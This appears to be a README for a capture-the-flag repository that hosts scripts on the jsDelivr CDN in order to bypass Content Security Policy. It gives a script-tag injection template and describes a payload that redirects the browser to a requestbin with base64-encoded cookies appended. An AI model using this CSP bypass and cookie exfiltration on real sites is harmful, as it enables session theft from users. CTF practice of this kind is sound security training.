# ctf-jsdelivr-repo
Repository for delivering script files through jsdelivr in order to bypass CSP restrictions

To run a script, use the following html element:  
`<script src='https://cdn.jsdelivr.net/gh/Victor4X/ctf-jsdelivr-repo/{script_file}'>`

## Scripts:
`requestbin-redirect.js` :  
Redirect the window to `{my-requestbin}?{btoa(document.cookie)}` (only useful for me)
